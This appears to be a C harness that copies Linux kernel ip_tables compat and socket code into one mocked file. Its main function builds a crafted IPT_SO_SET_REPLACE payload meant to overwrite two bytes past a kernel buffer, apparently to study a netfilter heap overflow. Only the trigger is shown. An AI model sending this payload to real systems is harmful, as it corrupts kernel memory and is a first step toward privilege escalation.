		info->hook_entry[i] = 0xFFFFFFFF;
		info->underflow[i] = 0xFFFFFFFF;
	}

	printf("translate_compat_table: size %u\n", info->size);
	j = 0;
	xt_compat_lock(AF_INET);
	xt_compat_init_offsets(AF_INET, number);
	/* Walk through entries, checking offsets. */
	xt_entry_foreach(iter0, entry0, total_size) {
		ret = check_compat_entry_size_and_hooks(iter0, info, &size,
							entry0,
							entry0 + total_size,
							hook_entries,
							underflows,
							name);
		if (ret != 0)
			goto out_unlock;
		++j;
	}

	ret = -EINVAL;
	if (j != number) {
		printf("translate_compat_table: %u not %u entries\n",
			 j, number);
		goto out_unlock;
	}

	/* Check hooks all assigned */
	for (i = 0; i < NF_INET_NUMHOOKS; i++) {
		/* Only hooks which are valid */
		if (!(valid_hooks & (1 << i)))
			continue;
		if (info->hook_entry[i] == 0xFFFFFFFF) {
			printf("Invalid hook entry %u %u\n",
				 i, hook_entries[i]);
			goto out_unlock;
		}
		if (info->underflow[i] == 0xFFFFFFFF) {
			printf("Invalid underflow %u %u\n",
				 i, underflows[i]);
			goto out_unlock;
		}
	}

	ret = -ENOMEM;
	newinfo = xt_alloc_table_info(size);
	if (!newinfo)
		goto out_unlock;

	newinfo->number = number;
	for (i = 0; i < NF_INET_NUMHOOKS; i++) {
		newinfo->hook_entry[i] = info->hook_entry[i];
		newinfo->underflow[i] = info->underflow[i];
	}
	entry1 = newinfo->entries;
	pos = entry1;
	size = total_size;
	xt_entry_foreach(iter0, entry0, total_size) {
		ret = compat_copy_entry_from_user(iter0, &pos, &size,
						  name, newinfo, entry1);
		if (ret != 0)
			break;
	}
	xt_compat_flush_offsets(AF_INET);
	xt_compat_unlock(AF_INET);
	if (ret)
		goto free_newinfo;

	ret = -ELOOP;
	if (!mark_source_chains(newinfo, valid_hooks, entry1))
		goto free_newinfo;

	i = 0;
	xt_entry_foreach(iter1, entry1, newinfo->size) {
		ret = compat_check_entry(iter1, net, name);
		if (ret != 0)
			break;
		++i;
		if (strcmp(ipt_get_target(iter1)->u.user.name,
		    XT_ERROR_TARGET) == 0)
			++newinfo->stacksize;
	}
	if (ret) {
		/*
		 * The first i matches need cleanup_entry (calls ->destroy)
		 * because they had called ->check already. The other j-i
		 * entries need only release.
		 */
		int skip = i;
		j -= i;
		xt_entry_foreach(iter0, entry0, newinfo->size) {
			if (skip-- > 0)
				continue;
			if (j-- == 0)
				break;
			compat_release_entry(iter0);
		}
		xt_entry_foreach(iter1, entry1, newinfo->size) {
			if (i-- == 0)
				break;
			cleanup_entry(iter1, net);
		}
		xt_free_table_info(newinfo);
		return ret;
	}

	*pinfo = newinfo;
	*pentry0 = entry1;
	xt_free_table_info(info);
	return 0;

free_newinfo:
	xt_free_table_info(newinfo);
out:
	xt_entry_foreach(iter0, entry0, total_size) {
		if (j-- == 0)
			break;
		compat_release_entry(iter0);
	}
	return ret;
out_unlock:
	xt_compat_flush_offsets(AF_INET);
	xt_compat_unlock(AF_INET);
	goto out;

}//translate_compat_table

/**
 * @brief  unable to fix the definition of {copy_from_user()} in the software -- System call
 * 
 * Source file -- ip_tables.c (Line 1801)
 * =============== STEP 2  =================
 * 
 * @param net 
 * @param user 
 * @param len 
 * @return int 
 */
static int compat_do_replace(struct net *net, void __user *user, unsigned int len)
{
	int ret;
	struct compat_ipt_replace tmp;
	struct xt_table_info *newinfo;
	void *loc_cpu_entry;
	struct ipt_entry *iter;

	if (copy_from_user(&tmp, user, sizeof(tmp)) != 0)
		return -EFAULT;

	/* overflow check */
	if (tmp.size >= INT_MAX / num_possible_cpus())
		return -ENOMEM;
	if (tmp.num_counters >= INT_MAX / sizeof(struct xt_counters))
		return -ENOMEM;
	if (tmp.num_counters == 0)
		return -EINVAL;

	tmp.name[sizeof(tmp.name)-1] = 0;

	newinfo = xt_alloc_table_info(tmp.size);
	if (!newinfo)
		return -ENOMEM;

	loc_cpu_entry = newinfo->entries;
	if (copy_from_user(loc_cpu_entry, user + sizeof(tmp),
			   tmp.size) != 0) {
		ret = -EFAULT;
		goto free_newinfo;
	}

	ret = translate_compat_table(net, tmp.name, tmp.valid_hooks,
				     &newinfo, &loc_cpu_entry, tmp.size,
				     tmp.num_entries, tmp.hook_entry,
				     tmp.underflow);
	if (ret != 0)
		goto free_newinfo;

	printf("compat_do_replace: Translated table\n");

	ret = __do_replace(net, tmp.name, tmp.valid_hooks, newinfo,
			   tmp.num_counters, compat_ptr(tmp.counters));
	if (ret)
		goto free_newinfo_untrans;
	return 0;

 free_newinfo_untrans:
	xt_entry_foreach(iter, loc_cpu_entry, newinfo->size)
		cleanup_entry(iter, net);
 free_newinfo:
	xt_free_table_info(newinfo);
	return ret;
}//compat_do_replace
/** End of Step 2 */

/**
 * @brief 
 * 
 * @param sk 
 * @param optval 
 * @param optlen 
 * @return int 
 */
static int sock_setbindtodevice(struct sock *sk, char __user *optval,
				int optlen)
{
	int ret = -ENOPROTOOPT;
#ifdef CONFIG_NETDEVICES
	struct net *net = sock_net(sk);
	char devname[IFNAMSIZ];
	int index;

	/* Sorry... */
	ret = -EPERM;
	if (!ns_capable(net->user_ns, CAP_NET_RAW))
		goto out;

	ret = -EINVAL;
	if (optlen < 0)
		goto out;

	/* Bind this socket to a particular device like "eth0",
	 * as specified in the passed interface name. If the
	 * name is "" or the option length is zero the socket
	 * is not bound.
	 */
	if (optlen > IFNAMSIZ - 1)
		optlen = IFNAMSIZ - 1;
	memset(devname, 0, sizeof(devname));

	ret = -EFAULT;
	if (copy_from_user(devname, optval, optlen))
		goto out;

	index = 0;
	if (devname[0] != '\0') {
		struct net_device *dev;

		rcu_read_lock();
		dev = dev_get_by_name_rcu(net, devname);
		if (dev)
			index = dev->ifindex;
		rcu_read_unlock();
		ret = -ENODEV;
		if (!dev)
			goto out;
	}

	lock_sock(sk);
	sk->sk_bound_dev_if = index;
	sk_dst_reset(sk);
	release_sock(sk);

	ret = 0;

out:
#endif

	return ret;
}//sock_setbindtodevice


/*
 *	This is meant for all protocols to use and covers goings on
 *	at the socket level. Everything here is generic.
 */

int sock_setsockopt(struct socket *sock, int level, int optname,
		    char __user *optval, unsigned int optlen)
{
	struct sock *sk = sock->sk;
	int val;
	int valbool;
	struct linger ling;
	int ret = 0;

	/*
	 *	Options without arguments
	 */

	if (optname == SO_BINDTODEVICE)
		return sock_setbindtodevice(sk, optval, optlen);

	if (optlen < sizeof(int))
		return -EINVAL;

	if (get_user(val, (int __user *)optval))
		return -EFAULT;

	valbool = val ? 1 : 0;

	lock_sock(sk);

	switch (optname) {
	case SO_DEBUG:
		if (val && !capable(CAP_NET_ADMIN))
			ret = -EACCES;
		else
			sock_valbool_flag(sk, SOCK_DBG, valbool);
		break;
	case SO_REUSEADDR:
		sk->sk_reuse = (valbool ? SK_CAN_REUSE : SK_NO_REUSE);
		break;
	case SO_REUSEPORT:
		sk->sk_reuseport = valbool;
		break;
	case SO_TYPE:
	case SO_PROTOCOL:
	case SO_DOMAIN:
	case SO_ERROR:
		ret = -ENOPROTOOPT;
		break;
	case SO_DONTROUTE:
		sock_valbool_flag(sk, SOCK_LOCALROUTE, valbool);
		break;
	case SO_BROADCAST:
		sock_valbool_flag(sk, SOCK_BROADCAST, valbool);
		break;
	case SO_SNDBUF:
		/* Don't error on this BSD doesn't and if you think
		 * about it this is right. Otherwise apps have to
		 * play 'guess the biggest size' games. RCVBUF/SNDBUF
		 * are treated in BSD as hints
		 */
		val = min_t(u32, val, sysctl_wmem_max);
set_sndbuf:
		sk->sk_userlocks |= SOCK_SNDBUF_LOCK;
		sk->sk_sndbuf = max_t(u32, val * 2, SOCK_MIN_SNDBUF);
		/* Wake up sending tasks if we upped the value. */
		sk->sk_write_space(sk);
		break;

	case SO_SNDBUFFORCE:
		if (!capable(CAP_NET_ADMIN)) {
			ret = -EPERM;
			break;
		}
		goto set_sndbuf;

	case SO_RCVBUF:
		/* Don't error on this BSD doesn't and if you think
		 * about it this is right. Otherwise apps have to
		 * play 'guess the biggest size' games. RCVBUF/SNDBUF
		 * are treated in BSD as hints
		 */
		val = min_t(u32, val, sysctl_rmem_max);
set_rcvbuf:
		sk->sk_userlocks |= SOCK_RCVBUF_LOCK;
		/*
		 * We double it on the way in to account for
		 * "struct sk_buff" etc. overhead.   Applications
		 * assume that the SO_RCVBUF setting they make will
		 * allow that much actual data to be received on that
		 * socket.
		 *
		 * Applications are unaware that "struct sk_buff" and
		 * other overheads allocate from the receive buffer
		 * during socket buffer allocation.
		 *
		 * And after considering the possible alternatives,
		 * returning the value we actually used in getsockopt
		 * is the most desirable behavior.
		 */
		sk->sk_rcvbuf = max_t(u32, val * 2, SOCK_MIN_RCVBUF);
		break;

	case SO_RCVBUFFORCE:
		if (!capable(CAP_NET_ADMIN)) {
			ret = -EPERM;
			break;
		}
		goto set_rcvbuf;

	case SO_KEEPALIVE:
#ifdef CONFIG_INET
		if (sk->sk_protocol == IPPROTO_TCP &&
		    sk->sk_type == SOCK_STREAM)
			tcp_set_keepalive(sk, valbool);
#endif
		sock_valbool_flag(sk, SOCK_KEEPOPEN, valbool);
		break;

	case SO_OOBINLINE:
		sock_valbool_flag(sk, SOCK_URGINLINE, valbool);
		break;

	case SO_NO_CHECK:
		sk->sk_no_check_tx = valbool;
		break;

	case SO_PRIORITY:
		if ((val >= 0 && val <= 6) ||
		    ns_capable(sock_net(sk)->user_ns, CAP_NET_ADMIN))
			sk->sk_priority = val;
		else
			ret = -EPERM;
		break;

	case SO_LINGER:
		if (optlen < sizeof(ling)) {
			ret = -EINVAL;	/* 1003.1g */
			break;
		}
		if (copy_from_user(&ling, optval, sizeof(ling))) {
			ret = -EFAULT;
			break;
		}
		if (!ling.l_onoff)
			sock_reset_flag(sk, SOCK_LINGER);
		else {
#if (BITS_PER_LONG == 32)
			if ((unsigned int)ling.l_linger >= MAX_SCHEDULE_TIMEOUT/HZ)
				sk->sk_lingertime = MAX_SCHEDULE_TIMEOUT;
			else
#endif
				sk->sk_lingertime = (unsigned int)ling.l_linger * HZ;
			sock_set_flag(sk, SOCK_LINGER);
		}
		break;

	case SO_BSDCOMPAT:
		sock_warn_obsolete_bsdism("setsockopt");
		break;

	case SO_PASSCRED:
		if (valbool)
			set_bit(SOCK_PASSCRED, &sock->flags);
		else
			clear_bit(SOCK_PASSCRED, &sock->flags);
		break;

	case SO_TIMESTAMP:
	case SO_TIMESTAMPNS:
		if (valbool)  {
			if (optname == SO_TIMESTAMP)
				sock_reset_flag(sk, SOCK_RCVTSTAMPNS);
			else
				sock_set_flag(sk, SOCK_RCVTSTAMPNS);
			sock_set_flag(sk, SOCK_RCVTSTAMP);
			sock_enable_timestamp(sk, SOCK_TIMESTAMP);
		} else {
			sock_reset_flag(sk, SOCK_RCVTSTAMP);
			sock_reset_flag(sk, SOCK_RCVTSTAMPNS);
		}
		break;

	case SO_TIMESTAMPING:
		if (val & ~SOF_TIMESTAMPING_MASK) {
			ret = -EINVAL;
			break;
		}

		if (val & SOF_TIMESTAMPING_OPT_ID &&
		    !(sk->sk_tsflags & SOF_TIMESTAMPING_OPT_ID)) {
			if (sk->sk_protocol == IPPROTO_TCP &&
			    sk->sk_type == SOCK_STREAM) {
				if (sk->sk_state != TCP_ESTABLISHED) {
					ret = -EINVAL;
					break;
				}
				sk->sk_tskey = tcp_sk(sk)->snd_una;
			} else {
				sk->sk_tskey = 0;
			}
		}
		sk->sk_tsflags = val;
		if (val & SOF_TIMESTAMPING_RX_SOFTWARE)
			sock_enable_timestamp(sk,
					      SOCK_TIMESTAMPING_RX_SOFTWARE);
		else
			sock_disable_timestamp(sk,
					       (1UL << SOCK_TIMESTAMPING_RX_SOFTWARE));
		break;

	case SO_RCVLOWAT:
		if (val < 0)
			val = INT_MAX;
		sk->sk_rcvlowat = val ? : 1;
		break;

	case SO_RCVTIMEO:
		ret = sock_set_timeout(&sk->sk_rcvtimeo, optval, optlen);
		break;

	case SO_SNDTIMEO:
		ret = sock_set_timeout(&sk->sk_sndtimeo, optval, optlen);
		break;

	case SO_ATTACH_FILTER:
		ret = -EINVAL;
		if (optlen == sizeof(struct sock_fprog)) {
			struct sock_fprog fprog;

			ret = -EFAULT;
			if (copy_from_user(&fprog, optval, sizeof(fprog)))
				break;

			ret = sk_attach_filter(&fprog, sk);
		}
		break;

	case SO_ATTACH_BPF:
		ret = -EINVAL;
		if (optlen == sizeof(u32)) {
			u32 ufd;

			ret = -EFAULT;
			if (copy_from_user(&ufd, optval, sizeof(ufd)))
				break;

			ret = sk_attach_bpf(ufd, sk);
		}
		break;

	case SO_ATTACH_REUSEPORT_CBPF:
		ret = -EINVAL;
		if (optlen == sizeof(struct sock_fprog)) {
			struct sock_fprog fprog;

			ret = -EFAULT;
			if (copy_from_user(&fprog, optval, sizeof(fprog)))
				break;

			ret = sk_reuseport_attach_filter(&fprog, sk);
		}
		break;

	case SO_ATTACH_REUSEPORT_EBPF:
		ret = -EINVAL;
		if (optlen == sizeof(u32)) {
			u32 ufd;

			ret = -EFAULT;
			if (copy_from_user(&ufd, optval, sizeof(ufd)))
				break;

			ret = sk_reuseport_attach_bpf(ufd, sk);
		}
		break;

	case SO_DETACH_FILTER:
		ret = sk_detach_filter(sk);
		break;

	case SO_LOCK_FILTER:
		if (sock_flag(sk, SOCK_FILTER_LOCKED) && !valbool)
			ret = -EPERM;
		else
			sock_valbool_flag(sk, SOCK_FILTER_LOCKED, valbool);
		break;

	case SO_PASSSEC:
		if (valbool)
			set_bit(SOCK_PASSSEC, &sock->flags);
		else
			clear_bit(SOCK_PASSSEC, &sock->flags);
		break;
	case SO_MARK:
		if (!ns_capable(sock_net(sk)->user_ns, CAP_NET_ADMIN))
			ret = -EPERM;
		else
			sk->sk_mark = val;
		break;

	case SO_RXQ_OVFL:
		sock_valbool_flag(sk, SOCK_RXQ_OVFL, valbool);
		break;

	case SO_WIFI_STATUS:
		sock_valbool_flag(sk, SOCK_WIFI_STATUS, valbool);
		break;

	case SO_PEEK_OFF:
		if (sock->ops->set_peek_off)
			ret = sock->ops->set_peek_off(sk, val);
		else
			ret = -EOPNOTSUPP;
		break;

	case SO_NOFCS:
		sock_valbool_flag(sk, SOCK_NOFCS, valbool);
		break;

	case SO_SELECT_ERR_QUEUE:
		sock_valbool_flag(sk, SOCK_SELECT_ERR_QUEUE, valbool);
		break;

#ifdef CONFIG_NET_RX_BUSY_POLL
	case SO_BUSY_POLL:
		/* allow unprivileged users to decrease the value */
		if ((val > sk->sk_ll_usec) && !capable(CAP_NET_ADMIN))
			ret = -EPERM;
		else {
			if (val < 0)
				ret = -EINVAL;
			else
				sk->sk_ll_usec = val;
		}
		break;
#endif

	case SO_MAX_PACING_RATE:
		sk->sk_max_pacing_rate = val;
		sk->sk_pacing_rate = min(sk->sk_pacing_rate,
					 sk->sk_max_pacing_rate);
		break;

	case SO_INCOMING_CPU:
		sk->sk_incoming_cpu = val;
		break;

	case SO_CNX_ADVICE:
		if (val == 1)
			dst_negative_advice(sk);
		break;
	default:
		ret = -ENOPROTOOPT;
		break;
	}
	release_sock(sk);
	return ret;
}//sock_setsockopt

/*
 *	Set a socket option. Because we don't know the option lengths we have
 *	to pass the user mode parameter for the protocols to sort out.
 */

SYSCALL_DEFINE5(setsockopt, int, fd, int, level, int, optname,
		char __user *, optval, int, optlen)
{
	int err, fput_needed;
	struct socket *sock;

	if (optlen < 0)
		return -EINVAL;

	sock = sockfd_lookup_light(fd, &err, &fput_needed);
	if (sock != NULL) {
		err = security_socket_setsockopt(sock, level, optname);
		if (err)
			goto out_put;

		if (level == SOL_SOCKET)
			err =
			    sock_setsockopt(sock, level, optname, optval,
					    optlen);
		else
			err =
			    sock->ops->setsockopt(sock, level, optname, optval,
						  optlen);
out_put:
		fput_light(sock->file, fput_needed);
	}
	return err;
}

/**
 * @brief 
 * 
 * @param file 
 * @param err 
 * @return struct socket* 
 */
struct socket *sock_from_file(struct file *file, int *err)
{
	if (file->f_op == &socket_file_ops)
		return file->private_data;	/* set in sock_map_fd */

	*err = -ENOTSOCK;
	return NULL;
}//sock_from_file

/**
 * @brief 
 * 
 * @param fd 
 * @param err 
 * @param fput_needed 
 * @return struct socket* 
 */
static struct socket *sockfd_lookup_light(int fd, int *err, int *fput_needed)
{
	struct fd f = fdget(fd);
	struct socket *sock;

	*err = -EBADF;
	if (f.file) {
		sock = sock_from_file(f.file, err);
		if (likely(sock)) {
			*fput_needed = f.flags;
			return sock;
		}
		fdput(f);
	}
	return NULL;
}//sockfd_lookup_light

/**
 *	sock_release	-	close a socket
 *	@sock: socket to close
 *
 *	The socket is released from the protocol stack if it has a release
 *	callback, and the inode is then released if the socket is bound to
 *	an inode not a file.
 */

void sock_release(struct socket *sock)
{
	if (sock->ops) {
		struct module *owner = sock->ops->owner;

		sock->ops->release(sock);
		sock->ops = NULL;
		module_put(owner);
	}

	if (rcu_dereference_protected(sock->wq, 1)->fasync_list)
		pr_err("%s: fasync list not empty!\n", __func__);

	this_cpu_sub(sockets_in_use, 1);
	if (!sock->file) {
		iput(SOCK_INODE(sock));
		return;
	}
	sock->file = NULL;
}//sock_release


/**
 * @brief 
 * 
 * @param sock 
 * @param family 
 * @param type 
 * @param protocol 
 * @param kern 
 * @return int 
 */
int security_socket_post_create(struct socket *sock, int family,
				int type, int protocol, int kern)
{
	return call_int_hook(socket_post_create, 0, sock, family, type,
						protocol, kern);
}//security_socket_post_create

/**
 *	sock_alloc	-	allocate a socket
 *
 *	Allocate a new inode and socket object. The two are bound together
 *	and initialised. The socket is then returned. If we are out of inodes
 *	NULL is returned.
 */

/**
 * @brief 
 * 
 * @return struct socket* 
 */
struct socket *sock_alloc(void)
{
	struct inode *inode;
	struct socket *sock;

	inode = new_inode_pseudo(sock_mnt->mnt_sb);
	if (!inode)
		return NULL;

	sock = SOCKET_I(inode);

	kmemcheck_annotate_bitfield(sock, type);
	inode->i_ino = get_next_ino();
	inode->i_mode = S_IFSOCK | S_IRWXUGO;
	inode->i_uid = current_fsuid();
	inode->i_gid = current_fsgid();
	inode->i_op = &sockfs_inode_ops;

	this_cpu_add(sockets_in_use, 1);
	return sock;
}//sock_alloc

/**
 * @brief 
 * 
 * @param family 
 * @param type 
 * @param protocol 
 * @param kern 
 * @return int 
 */
int security_socket_create(int family, int type, int protocol, int kern)
{
	return call_int_hook(socket_create, 0, family, type, protocol, kern);
}//security_socket_create


/**
 * @brief creating a socket
 * 
 * @param net 
 * @param family 
 * @param type 
 * @param protocol 
 * @param res 
 * @param kern 
 * @return int 
 */
int __sock_create(struct net *net, int family, int type, int protocol,
			 struct socket **res, int kern)
{
	int err;
	struct socket *sock;
	const struct net_proto_family *pf;

	/*
	 *      Check protocol is in range
	 */
	if (family < 0 || family >= NPROTO)
		return -EAFNOSUPPORT;
	if (type < 0 || type >= SOCK_MAX)
		return -EINVAL;

	/* Compatibility.

	   This uglymoron is moved from INET layer to here to avoid
	   deadlock in module load.
	 */
	if (family == PF_INET && type == SOCK_PACKET) {
		pr_info_once("%s uses obsolete (PF_INET,SOCK_PACKET)\n",
			     current->comm);
		family = PF_PACKET;
	}

	err = security_socket_create(family, type, protocol, kern);
	if (err)
		return err;

	/*
	 *	Allocate the socket and allow the family to set things up. if
	 *	the protocol is 0, the family is instructed to select an appropriate
	 *	default.
	 */
	sock = sock_alloc();
	if (!sock) {
		net_warn_ratelimited("socket: no more sockets\n");
		return -ENFILE;	/* Not exactly a match, but its the
				   closest posix thing */
	}

	sock->type = type;

#ifdef CONFIG_MODULES
	/* Attempt to load a protocol module if the find failed.
	 *
	 * 12/09/1996 Marcin: But! this makes REALLY only sense, if the user
	 * requested real, full-featured networking support upon configuration.
	 * Otherwise module support will break!
	 */
	if (rcu_access_pointer(net_families[family]) == NULL)
		request_module("net-pf-%d", family);
#endif

	rcu_read_lock();
	pf = rcu_dereference(net_families[family]);
	err = -EAFNOSUPPORT;
	if (!pf)
		goto out_release;

	/*
	 * We will call the ->create function, that possibly is in a loadable
	 * module, so we have to bump that loadable module refcnt first.
	 */
	if (!try_module_get(pf->owner))
		goto out_release;

	/* Now protected by module ref count */
	rcu_read_unlock();

	err = pf->create(net, sock, protocol, kern);
	if (err < 0)
		goto out_module_put;

	/*
	 * Now to bump the refcnt of the [loadable] module that owns this
	 * socket at sock_release time we decrement its refcnt.
	 */
	if (!try_module_get(sock->ops->owner))
		goto out_module_busy;

	/*
	 * Now that we're done with the ->create function, the [loadable]
	 * module can have its refcnt decremented
	 */
	module_put(pf->owner);
	err = security_socket_post_create(sock, family, type, protocol, kern);
	if (err)
		goto out_sock_release;
	*res = sock;

	return 0;

out_module_busy:
	err = -EAFNOSUPPORT;
out_module_put:
	sock->ops = NULL;
	module_put(pf->owner);
out_sock_release:
	sock_release(sock);
	return err;

out_release:
	rcu_read_unlock();
	goto out_sock_release;
}//__sock_create


/**
 * @brief 
 * 
 * @param family 
 * @param type 
 * @param protocol 
 * @param res 
 * @return int 
 */
int sock_create(int family, int type, int protocol, struct socket **res)
{
	return __sock_create(current->nsproxy->net_ns, family, type, protocol, res, 0);
}//sock_create

/** End Mock socket setup Call **/

/**system call for creating socket
 * @brief Construct a new syscall define3 object
 * 
 */
SYSCALL_DEFINE3(socket, int, family, int, type, int, protocol)
{
	int retval;
	struct socket *sock;
	int flags;

	/* Check the SOCK_* constants for consistency.  */
	BUILD_BUG_ON(SOCK_CLOEXEC != O_CLOEXEC);
	BUILD_BUG_ON((SOCK_MAX | SOCK_TYPE_MASK) != SOCK_TYPE_MASK);
	BUILD_BUG_ON(SOCK_CLOEXEC & SOCK_TYPE_MASK);
	BUILD_BUG_ON(SOCK_NONBLOCK & SOCK_TYPE_MASK);

	flags = type & ~SOCK_TYPE_MASK;
	if (flags & ~(SOCK_CLOEXEC | SOCK_NONBLOCK))
		return -EINVAL;
	type &= SOCK_TYPE_MASK;

	if (SOCK_NONBLOCK != O_NONBLOCK && (flags & SOCK_NONBLOCK))
		flags = (flags & ~SOCK_NONBLOCK) | O_NONBLOCK;

	retval = sock_create(family, type, protocol, &sock);
	if (retval < 0)
		goto out;

	retval = sock_map_fd(sock, flags & (O_CLOEXEC | O_NONBLOCK));
	if (retval < 0)
		goto out_release;

out:
	/* It may be already another descriptor 8) Not kernel problem. */
	return retval;

out_release:
	sock_release(sock);
	return retval;
}


/** MAIN FUNCTION **/
int main(int argc, char *argv[]) {

      int s;
	int fd;

	/**
	 * @brief socket is a system call, it is neccessary to mock in te single file
	 * 
	 */
	if ((s = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
		perror("[-] socket");
		goto err_no_rmid;
	}
	printf("s: %d\n",s);

	struct __attribute__((__packed__)) {
	struct ipt_replace replace;
	struct ipt_entry entry;
	struct xt_entry_match match;
	char pad[0x108 + PRIMARY_SIZE - 0x200 - 0x2];
	struct xt_entry_target target;
	} data = {0};

	data.replace.num_counters = 1;
	data.replace.num_entries = 1;
	data.replace.size = (sizeof(data.entry) + sizeof(data.match) +
				sizeof(data.pad) + sizeof(data.target));

	data.entry.next_offset = (sizeof(data.entry) + sizeof(data.match) +
					sizeof(data.pad) + sizeof(data.target));
	data.entry.target_offset =
		(sizeof(data.entry) + sizeof(data.match) + sizeof(data.pad));

	data.match.u.user.match_size = (sizeof(data.match) + sizeof(data.pad));
	strcpy(data.match.u.user.name, "icmp");
	data.match.u.user.revision = 0;

	data.target.u.user.target_size = sizeof(data.target);
	strcpy(data.target.u.user.name, "NFQUEUE");
	data.target.u.user.revision = 1;

	// Partially overwrite the adjacent buffer with 2 bytes of zero.
	fd =  setsockopt(s, SOL_IP, IPT_SO_SET_REPLACE, &data, sizeof(data));
	printf("fd %d\n",fd);
	if (fd != 0) {
		
	     printf("the error: %d\n",errno);

		if (errno == ENOPROTOOPT) {
			printf("[-] Error ip_tables module is not loaded.\n");
			return -1;
		}
	}

err_no_rmid:
  return 1;


return 0;
} /** END OF MAIN **/